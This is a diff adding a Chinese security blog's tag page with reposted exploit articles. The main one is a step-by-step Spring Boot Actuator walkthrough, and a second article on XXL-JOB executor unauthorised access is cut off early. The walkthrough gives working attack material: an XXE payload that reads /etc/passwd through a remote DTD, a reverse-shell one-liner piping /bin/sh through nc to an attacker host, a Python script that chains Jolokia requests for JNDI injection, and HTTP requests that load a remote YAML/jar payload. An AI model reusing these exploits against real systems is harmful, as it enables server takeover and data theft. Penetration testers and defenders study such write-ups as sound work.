@@ -1,0 +1,1103 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    
+    <title>Tag: Reprint | 氕氘氚</title>
+    <meta name="keywords" content="hexo,theme,otakism,otaku"/>
+    <meta name="HandheldFriendly" content="True"/>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="google-site-verification" content=""/>
+    <meta name="baidu-site-verification" content=""/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="Open your eyes to see the light in life">
+<meta property="og:type" content="website">
+<meta property="og:title" content="氕氘氚">
+<meta property="og:url" content="http://example.com/tags/Reprint/page/6/index.html">
+<meta property="og:site_name" content="氕氘氚">
+<meta property="og:description" content="Open your eyes to see the light in life">
+<meta property="og:locale">
+<meta property="article:author" content="Szczecin">
+<meta name="twitter:card" content="summary">
+    
+
+    <!-- Favicon -->
+    
+        <link rel="icon" href="/img/favicon.ico" />
+    
+
+    <!-- Font -->
+    <link href="https://fonts.googleapis.com/css?family=Inconsolata|Roboto:300,400,700" rel="stylesheet">
+
+    
+<link rel="stylesheet" href="/style.css">
+
+    <script>
+      function setLoadingBarProgress(num) {
+        document.getElementById('loading-bar').style.width = num + "%";
+      }
+    </script>
+
+    
+
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+
+<div id="loading-bar-wrapper">
+  <div id="loading-bar"></div>
+</div>
+
+<script>setLoadingBarProgress(20)</script>
+
+<div id="site-wrapper">
+
+    <header id="header">
+    <div id="header-wrapper" class="clearfix">
+        <a id="logo" href="/">
+            <img src="/img/logo.png"/>
+            <span id="site-desc">
+                Be A Gorgeous World
+            </span>
+        </a>
+        <button id="site-nav-switch">
+            <span class="icon icon-menu"></span>
+        </button>
+    </div>
+</header>
+    <script>setLoadingBarProgress(40);</script>
+
+    <main id="main" role="main">
+        
+  <section class="page-header tag">
+    <h1>- <span>Reprint</span> -</h1>
+  </section>
+
+
+
+
+
+
+<section class="post-list">
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/10/06/Spring-Boot-Actuator-RCE/">
+                Spring Boot Actuator 漏洞利用
+            </a>
+        </h2>
+    
+    <time>
+        Oct 6, 2023
+    </time>
+    <section class="content">
+        <h1><span id="spring-boot-actuator-漏洞利用">Spring Boot Actuator 漏洞利用</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.freebuf.com/column/234266.html">诺言</a> 并作补充</p>
+</blockquote>
+<h2><span id="前言">前言</span></h2><blockquote>
+<p>Actuator 是 Spring Boot 提供的服务监控和管理中间件。当 Spring Boot 应用程序运行时，它会自动将多个端点注册到路由进程中。而由于对这些端点的错误配置，就有可能导致一些系统信息泄露、XXE、甚至是 RCE 等安全问题。</p>
+</blockquote>
+<h2><span id="漏洞发现">漏洞发现</span></h2><blockquote>
+<p>通常通过两个位置判断网站是否使用了Spring Boot框架。<br>1、网站图片文件是一个绿色的树叶。<br>2、特有的报错信息。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/1.jpg" alt="image"></p>
+</blockquote>
+<h2><span id="影响版本">影响版本</span></h2><blockquote>
+<p>Spring Boot &lt; 1.5 默认未授权访问所有端点<br>Spring Boot &gt;&#x3D; 1.5 默认只允许访问&#x2F;health和&#x2F;info端点，但是此安全性通常被应用程序开发人员禁用</p>
+</blockquote>
+<h2><span id="端点描述">端点描述</span></h2><blockquote>
+<p>官方文档对每个端点的功能进行了描述。</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">路径            描述</span><br><span class="line">/autoconfig    提供了一份自动配置报告，记录哪些自动配置条件通过了，哪些没通过</span><br><span class="line">/beans         描述应用程序上下文里全部的Bean，以及它们的关系</span><br><span class="line">/env           获取全部环境属性</span><br><span class="line">/configprops   描述配置属性(包含默认值)如何注入Bean</span><br><span class="line">/dump          获取线程活动的快照</span><br><span class="line">/health        报告应用程序的健康指标，这些值由HealthIndicator的实现类提供</span><br><span class="line">/info          获取应用程序的定制信息，这些信息由info打头的属性提供</span><br><span class="line">/mappings      描述全部的URI路径，以及它们和控制器(包含Actuator端点)的映射关系</span><br><span class="line">/metrics       报告各种应用程序度量信息，比如内存用量和HTTP请求计数</span><br><span class="line">/shutdown      关闭应用程序，要求endpoints.shutdown.enabled设置为<span class="literal">true</span></span><br><span class="line">/trace         提供基本的HTTP请求跟踪信息(时间戳、HTTP头等)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Spring Boot 1.x版本端点在根URL下注册。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/2.jpg" alt="image"></p>
+<p>Spring Boot 2.x版本端点移动到&#x2F;actuator&#x2F;路径。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/3.jpg" alt="image"></p>
+<p>本文中端点的位置都是基于网站根目录下，实战中遇到的情况是，端点可能存放在多级目录下，需要自行进行寻找。<br>访问&#x2F;trace端点获取到近期服务器收到的请求信息。<br>如果存在登录用户的操作请求，可以伪造cookie进行登录。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/4.jpg" alt="image"></p>
+<p>访问&#x2F;env端点获取环境属性。<br>数据库账户泄漏<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/5.jpg" alt="image"></p>
+</blockquote>
+<h2><span id="jolokia端点利用">Jolokia端点利用</span></h2><blockquote>
+<p>大多数Actuator仅支持GET请求并仅显示敏感的配置数据,如果使用了不当的Jolokia端点，可能会产生XXE、甚至是RCE安全问题。</p>
+</blockquote>
+<h2><span id="reloadbyurl方法">reloadByURL方法</span></h2><blockquote>
+<p>查看&#x2F;jolokia&#x2F;list 中存在的 Mbeans，是否存在logback 库提供的reloadByURL方法。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/6.jpg" alt="image"></p>
+</blockquote>
+<h3><span id="xxe漏洞实现">xxe漏洞实现</span></h3><blockquote>
+<p>reloadByURL方法，允许远程加载logback.xml 配置文件，并且解析 xml 文件未做任何过滤措施，导致了xxe漏洞。<br>1、创建logback.xml和fileread.dtd文件</p>
+</blockquote>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">logback.xml,地址为公网vpsweb服务地址。</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [ <span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://x.x.x.x/fileread.dtd&quot;</span>&gt;</span>%remote;%int;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="symbol">&amp;trick;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fileread.dtd</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!ENTITY % d <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span> </span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">int</span> <span class="string">&quot;&lt;!ENTITY trick SYSTEM &#x27;:%d;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>2、把创建的logback.xml和fileread.dtd文件上传到公网vps的web目录下。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/7.jpg" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>3、远程访问logback.xml文件。</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.xxx.com/jolokia/exec/ch.qos.logback.classic:Name=<span class="keyword">default</span>,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/x.x.x.x!/logback.xml</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>成功利用xxe读取到etc&#x2F;passwd文件内容。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/8.jpg" alt="image"></p>
+</blockquote>
+<h3><span id="远程代码执行实现">远程代码执行实现</span></h3><blockquote>
+<p>可以在logback.xml中使用insertFromJNDI标签，这个标签允许我们从 JNDI 加载变量，导致了rce漏洞产生。<br>rce的流程主要分为4步。<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://www.secshi.com/21506.html">详细过程</a><br>1、构造 Get 请求访问目标，使其去外部服务器加载恶意 logback.xml 文件。<br>2、解析 logback.xml 时，最终会触发 InitialContext.lookup(URI) 操作，而URI 为恶意 RMI 服务地址。<br>3、恶意 RMI 服务器向目标返回一个 Reference 对象，Reference 对象中指定了目标本地存在的 BeanFactory 类，以及Bean Class 的类名、属性、属性值（这里为 ELProcessor 、x、eval(…))。<br>4、目标在进行 lookup() 操作时，会动态加载并实例化 BeanFactory 类，接着调用 factory.getObjectInstance() 方法，通过反射的方式实例化 Reference 所指向的任意 Bean Class，并且会调用 setter 方法为所有的属性赋值。对应我们的代码，最终调用 setter 方法的时候，就是执行如下代码：</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ELProcessor.<span class="built_in">eval</span>(\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).<span class="built_in">eval</span>(\&quot;new java.lang.ProcessBuilder[<span class="string">&#x27;(java.lang.String[])&#x27;</span>]([<span class="string">&#x27;/bin/sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,<span class="string">&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc evil-server-ip port &gt;/tmp/f&#x27;</span>]).start()\&quot;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>而 ELProcessor.eval() 会对 EL 表达式（这里为反弹 shell）进行求值，最终达到 RCE 的效果。</p>
+</blockquote>
+<blockquote>
+<p>下载<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://github.com/mpgn/Spring-Boot-Actuator-Exploit">rce利用代码</a>。<br>修改Spring-Boot-Actuator-Exploit\maliciousRMIServer\src\main\java\hello\EvilRMIServer.java的代码。<br>可以修改RMI远程监听的端口，和反弹shell的地址和端口。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/9.jpg" alt="image"><br>使用maven对java代码进行编译打包。<br>进入Spring-Boot-Actuator-Exploit-master&#x2F;maliciousRMIServer目录，执行<code>mvn clean install</code><br>打包成功后创建target目录下生成RMIServer-0.1.0.jar文件。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/10.jpg" alt="image"></p>
+<p><img src="/2023/10/06/Spring-Boot-Actuator-RCE/11.jpg" alt="image"></p>
+</blockquote>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">修改logback.xml文件内容。</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">insertFromJNDI</span> <span class="attr">env-entry-name</span>=<span class="string">&quot;rmi://x.x.x.x:1097/jndi&quot;</span> <span class="attr">as</span>=<span class="string">&quot;appName&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>把RMIServer-0.1.0.jar文件上传到公网vps上。<br>执行RMIServer-0.1.0.jar文件,开启攻击机上的RMI监听时需要通过’Djava.rmi.server.hostname&#x3D;x.x.x.x’指定自己的RMI监听的外网地址。<br><code>java -Djava.rmi.server.hostname=x.x.x.x -jar RMIServer-0.1.0.jar</code><br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/12.jpg" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>vps使用nc监听反弹shell指定的端口。<br><code>nc -lvp 9998</code><br>在漏洞url访问：<br><code>http://x.x.x.x/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!114.x.x.x!/logback.xml</code><br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/13.jpg" alt="image"><br>成功反弹shell。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/14.jpg" alt="image"></p>
+</blockquote>
+<h2><span id="createjndirealm方法">createJNDIRealm方法</span></h2><blockquote>
+<p>相关原理请查看<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://lucifaer.com/2019/03/13/Attack%2520Spring%2520Boot%2520Actuator%2520via%2520jolokia%2520Part%25202/%230x04-%25E6%259E%2584%25E9%2580%25A0poc">Attack Spring Boot Actuator via jolokia Part 2</a><br>查看&#x2F;jolokia&#x2F;list 中存在的是否存在org.apache.catalina.mbeans.MBeanFactory类提供的createJNDIRealm方法，可能存在JNDI注入，导致远程代码执行。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/15.jpg" alt="image"></p>
+<p>利用过程分为五步。<br>1、创建 JNDIRealm<br>2、写入 contextFactory 为 RegistryContextFactory<br>3、写入 connectionURL 为你的 RMI Service URL<br>4、停止 Realm<br>5、启动 Realm 以触发 JNDI 注入</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">可以使用burp一步步重放，也可以直接使用python脚本执行。</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line">url = sys.argv[<span class="number">1</span>] + <span class="string">&quot;/jolokia/&quot;</span></span><br><span class="line">pprint(url)</span><br><span class="line"><span class="comment">#创建JNDIRealm</span></span><br><span class="line">create_JNDIrealm = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:type=MBeanFactory&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;createJNDIRealm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arguments&quot;</span>: [<span class="string">&quot;Tomcat:type=Engine&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#写入contextFactory</span></span><br><span class="line">set_contextFactory = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;WRITE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;attribute&quot;</span>: <span class="string">&quot;contextFactory&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#写入connectionURL为自己公网RMI service地址</span></span><br><span class="line">set_connectionURL = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;WRITE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;attribute&quot;</span>: <span class="string">&quot;connectionURL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="string">&quot;rmi://x.x.x.x:1097/jndi&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#停止Realm</span></span><br><span class="line">stop_JNDIrealm = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;stop&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arguments&quot;</span>: []</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#运行Realm，触发JNDI 注入</span></span><br><span class="line">start = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;start&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arguments&quot;</span>: []</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">expoloit = [create_JNDIrealm, set_contextFactory, set_connectionURL, stop_JNDIrealm, start]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> expoloit:</span><br><span class="line">    rep = req.post(url, json=i)</span><br><span class="line">    pprint(rep.json())</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>使用之前打包好的jar包-RMIServer-0.1.0.jar，运行RMI服务<br><code>java -Djava.rmi.server.hostname=x.x.x.x -jar RMIServer-0.1.0.jar</code><br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/16.jpg" alt="image"></p>
+<p>使用nc监听反弹的端口<code>nc -lvp 9998</code><br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/17.jpg" alt="image"></p>
+<p>使用python发送请求<code>python exp.py http://x.x.x.x:8087</code><br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/18.jpg" alt="image"></p>
+<p>成功反弹shell。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/19.jpg" alt="image"></p>
+</blockquote>
+<h2><span id="spring-cloud-env">spring Cloud env</span></h2><blockquote>
+<p>当spring boot使用Spring Cloud 相关组件时，会存在spring.cloud.bootstrap.location属性，通过修改 spring.cloud.bootstrap.location 环境变量实现 RCE<br>漏洞原理参考<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/195929">https://www.anquanke.com/post/id/195929</a></p>
+</blockquote>
+<h3><span id="利用范围">利用范围</span></h3><blockquote>
+<p>Spring Boot 2.x 无法利用成功<br>Spring Boot 1.5.x 在使用 Dalston 版本时可利用成功，使用 Edgware 无法成功<br>Spring Boot &lt;&#x3D; 1.4 可利用成功</p>
+</blockquote>
+<h3><span id="利用过程">利用过程</span></h3><blockquote>
+<p>大致原理分为2步。<br>1、利用 &#x2F;env endpoint 修改 spring.cloud.bootstrap.location 属性值为一个外部 yml 配置文件 url 地址，如 <a target="_blank" rel="noopener" href="http://x.x.x.x/yaml-payload.yml">http://x.x.x.x/yaml-payload.yml</a><br>2、请求 &#x2F;refresh endpoint，触发程序下载外部 yml 文件，并由 SnakeYAML 库进行解析，因 SnakeYAML 在反序列化时支持指定 class 类型和构造方法的参数，结合 JDK 自带的 javax.script.ScriptEngineManager 类，可实现加载远程 jar 包，完成任意代码执行。<br>下载使用Michael Stepankin大牛提供的<a target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload">exp</a><br>更改执行的命令。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/20.jpg" alt="image"></p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">将java文件进行编译</span><br><span class="line"></span><br><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>把生成的jar文件挂载到公网http服务器。<br>修改 spring.cloud.bootstrap.location为外部 yml 配置文件地址。</p>
+</blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/env</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8090</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>59</span><br><span class="line"> </span><br><span class="line">spring.cloud.bootstrap.location=http://x.x.x.x/yaml-payload.yml</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><img src="/2023/10/06/Spring-Boot-Actuator-RCE/21.jpg" alt="image"></p>
+<p>请求 &#x2F;refresh 接口触发</p>
+</blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/refresh</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8090</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>命令执行成功。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/22.jpg" alt="image"></p>
+</blockquote>
+<h2><span id="参考文章">参考文章</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.veracode.com/blog/research/exploiting-spring-boot-actuators">https://www.veracode.com/blog/research/exploiting-spring-boot-actuators</a><br><a target="_blank" rel="noopener" href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java">https://www.veracode.com/blog/research/exploiting-jndi-injections-java</a><br><a target="_blank" rel="noopener" href="http://radiosong.cn/index.php/2019/04/03/1.html">http://radiosong.cn/index.php/2019/04/03/1.html</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4258">https://xz.aliyun.com/t/4258</a><br><a target="_blank" rel="noopener" href="http://r3start.net/index.php/2019/01/20/377">http://r3start.net/index.php/2019/01/20/377</a><br><a target="_blank" rel="noopener" href="https://github.com/mpgn/Spring-Boot-Actuator-Exploit">https://github.com/mpgn/Spring-Boot-Actuator-Exploit</a><br><a target="_blank" rel="noopener" href="https://www.secshi.com/21506.html">https://www.secshi.com/21506.html</a><br><a target="_blank" rel="noopener" href="https://lucifaer.com/2019/03/13/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%202/#0x04-%E6%9E%84%E9%80%A0poc">https://lucifaer.com/2019/03/13/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%202/#0x04-%E6%9E%84%E9%80%A0poc</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/195929">https://www.anquanke.com/post/id/195929</a><br><a target="_blank" rel="noopener" href="http://vulsee.com/archives/vulsee_2019/1025_9168.html">http://vulsee.com/archives/vulsee_2019/1025_9168.html</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Spring/" rel="tag">Spring</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/09/03/XXL-JOB-Executor/">
+                XXL-JOB executor未授权访问漏洞
+            </a>
+        </h2>
+    
+    <time>
+        Sep 3, 2023
+    </time>
+    <section class="content">
+        <h1><span id="xxl-job-executor未授权访问漏洞">XXL-JOB executor未授权访问漏洞</span></h1><h2><span id="漏洞详情">漏洞详情</span></h2><blockquote>
+<p>XXL-JOB是一个轻量级分布式任务调度平台。默认情况下XXL-JOB的Restful API接口或RPC接口没有配置认证措施，未授权的攻击者可构造恶意请求，造成远程执行命令，直接控制服务器。</p>
+</blockquote>
+<h2><span id="漏洞影响">漏洞影响</span></h2><blockquote>
+<p>XXL-JOB &lt;&#x3D; 2.2.0</p>
+</blockquote>
+<h2><span id="漏洞分析">漏洞分析</span></h2><blockquote>
+<p>XXL-JOB的Restful API分为两种，一个 调度中心Restful API，一个 执行器Restful API。其中在执行器Restful API的任务触发声明中，发送请求的数据格式为：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">地址格式：</span><br><span class="line">    &#123;执行器内嵌服务跟地址&#125;/run 	<span class="comment">//也就是说为executor端的地址，ip:9999/run</span></span><br><span class="line"> </span><br><span class="line">Header： </span><br><span class="line">    XXL-JOB-ACCESS-TOKEN : &#123;请求令牌&#125; 	</span><br><span class="line"> </span><br><span class="line">请求数据格式如下，放置在 RequestBody 中，JSON格式： </span><br><span class="line">&#123; </span><br><span class="line">    <span class="string">&quot;jobId&quot;</span>:<span class="number">1</span>, <span class="comment">// 任务ID </span></span><br><span class="line">    <span class="string">&quot;executorHandler&quot;</span>:<span class="string">&quot;demoJobHandler&quot;</span>, <span class="comment">// 任务标识 </span></span><br><span class="line">    <span class="string">&quot;executorParams&quot;</span>:<span class="string">&quot;demoJobHandler&quot;</span>, <span class="comment">// 任务参数 </span></span><br><span class="line">    <span class="string">&quot;executorBlockStrategy&quot;</span>:<span class="string">&quot;COVER_EARLY&quot;</span>, <span class="comment">// 任务阻塞策略，可选值参考   com.xxl.job.core.enums.ExecutorBlockStrategyEnum </span></span><br><span class="line">    <span class="string">&quot;executorTimeout&quot;</span>:<span class="number">0</span>, <span class="comment">// 任务超时时间，单位秒，大于零时生效 </span></span><br><span class="line">    <span class="string">&quot;logId&quot;</span>:<span class="number">1</span>, <span class="comment">// 本次调度日志ID </span></span><br><span class="line">    <span class="string">&quot;logDateTime&quot;</span>:<span class="number">1586629003729</span>, <span class="comment">// 本次调度日志时间 </span></span><br><span class="line">    <span class="string">&quot;glueType&quot;</span>:<span class="string">&quot;BEAN&quot;</span>, <span class="comment">// 任务模式，可选值参考 com.xxl.job.core.glue.GlueTypeEnum 		&quot;glueSource&quot;:&quot;xxx&quot;, // GLUE脚本代码 </span></span><br><span class="line">    <span class="string">&quot;glueUpdatetime&quot;</span>:<span class="number">1586629003727</span>, <span class="comment">// GLUE脚本更新时间，用于判定脚本是否变更以及是否需要刷新 </span></span><br><span class="line">    <span class="string">&quot;broadcastIndex&quot;</span>:<span class="number">0</span>, <span class="comment">// 分片参数：当前分片 </span></span><br><span class="line">    <span class="string">&quot;broadcastTotal&quot;</span>:<span class="number">0</span> <span class="comment">// 分片参数：总分片 </span></span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">响应数据格式： </span><br><span class="line">    &#123; <span class="string">&quot;code&quot;</span>: <span class="number">200</span>, <span class="comment">// 200 表示正常、其他失败 &quot;msg&quot;: null // 错误提示消息 &#125;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>其中”glueType”:”BEAN” 任务模式的选值如下</p>
+</blockquote>
